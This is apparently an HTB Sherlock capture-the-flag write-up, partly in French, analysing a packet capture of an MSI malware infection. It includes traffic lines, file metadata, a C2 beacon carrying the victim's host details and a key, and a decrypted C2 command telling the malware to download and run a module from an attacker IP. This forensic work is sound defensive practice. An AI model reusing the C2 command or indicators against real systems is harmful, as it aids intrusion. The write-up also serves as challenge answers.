

# Interceptor


A recent anomaly has been detected in our network traffic, suggesting a potential breach. Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data. Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.


What IP address did the original suspicious traffic come from?


```
12604	83.776137	10.4.17.101	85.239.53.219	HTTP/JSON	224	POST /api/gateway HTTP/1.1 , JavaScript Object Notation (application/json)
```


The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?

```
10945	62.577273	10.4.17.101	87.249.49.206	HTTP	216	PROPFIND /share HTTP/1.1 
```

It appears that this file is malware. What is its filename?

```
10999	64.741361	10.4.17.101	87.249.49.206	HTTP	233	GET /share/avp.msi HTTP/1.1 
```


What is the SSDEEP hash of the malware as reported by VirusTotal?

https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/details

According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?

https://www.virustotal.com/gui/file/dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a/community

What is the creation time of the malware?


```bash
─tximista at zaworudo in ~ 25-09-19 - 23:28:31
╰─○ exiftool /home/tximista/.exegol/workspaces/ctf/avp.msi 
ExifTool Version Number         : 13.30
File Name                       : avp.msi
Directory                       : /home/tximista/.exegol/workspaces/ctf
File Size                       : 1428 kB
File Modification Date/Time     : 2025:09:19 23:24:24+02:00
File Access Date/Time           : 2025:09:19 23:25:11+02:00
File Inode Change Date/Time     : 2025:09:19 23:24:24+02:00
File Permissions                : -rw-r-----
File Type                       : FPX
File Type Extension             : fpx
MIME Type                       : image/vnd.fpx
Last Printed                    : 2009:12:11 11:47:44
Create Date                     : 2009:12:11 11:47:44
Modify Date                     : 2020:09:18 14:06:51
```

What is the domain name that the malware is trying to connect with?

12569	72.486283	10.4.17.1	10.4.17.101	DNS	134	Standard query response 0x81f3 A api.ipify.org A 104.26.13.205 A 104.26.12.205 A 172.67.74.152


What is the IP address that the attacker has consistently used for communication?

85.239.53.219


```bash
─tximista at zaworudo in ~/.exegol/workspaces/ctf 25-09-20 - 0:00:22
╰─○ 7z l avp.msi   

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=fr_FR.UTF-8 Threads:8 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 1427968 bytes (1395 KiB)

Listing archive: avp.msi

--
Path = avp.msi
Type = Compound
Physical Size = 1427968
Extension = msi
Cluster Size = 512
Sector Size = 64
----
Path = disk1.cab
Size = 612281
Packed Size = 612352
--
Path = disk1.cab
Type = Cab
Physical Size = 612281
Method = MSZip
Blocks = 1
Volumes = 1
Volume Index = 0
ID = 1234

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-04-16 10:10:56 ....A       978944               forcedelctl.dll
------------------- ----- ------------ ------------  ------------------------
2024-04-16 10:10:56             978944      1427968  1 files
```
forcedelctl.dll est probablement l'agent c2

What program is used to execute the malware?

msiexec.exe ==> par déduction et vu sur VT

What is the hostname of the compromised machine?/What is the key that was used in the attack?/What is the os_version of the compromised machine?/What is the owner name of the compromised machine?

En clair dans les requetes http ou un string sur le pcap
```

{"key": "WkZPxBoH6CA3Ok4iI", "id": "b98c911c-e29c-396e-2990-a7441af79546"}POST /api/b98c911c-e29c-396e-2990-a7441af79546/tasks HTTP/1.1

{"version":"v1.4.0","ip":"173.66.46.97","domain":"WORKGROUP","hostname":"DESKTOP-FWQ3U4C","arch":"x86","os_version":"Windows 6.3.9600","cur_user":"User","owner":"Nevada"}"% fK
```



After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?

On trouve  dans le pcap un appel vers le C2, le malware envoi un beacon recoit une clef et un job en base64 puis déchiffre une commande a executer
![][Screenshot_20250920_222400.png]

```bash

[Sep 20, 2025 - 22:27:26 (CEST)] exegol-ctf /workspace # cat tasks    
{"id": "576ba7b6-077c-45fb-94b4-10fd156e93c3", "job": "B//jOYkMjUR2wj+L  
/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9s  
Y0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA=="}#

(venv) ╭─tximista at zaworudo in ~/Bidouille/Code 25-09-20 - 22:42:05
╰─(venv) ○ ./interceptor.py 
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}


```




#HTB #sherlock #rc4 #base64 #pcap #web #msi #malware 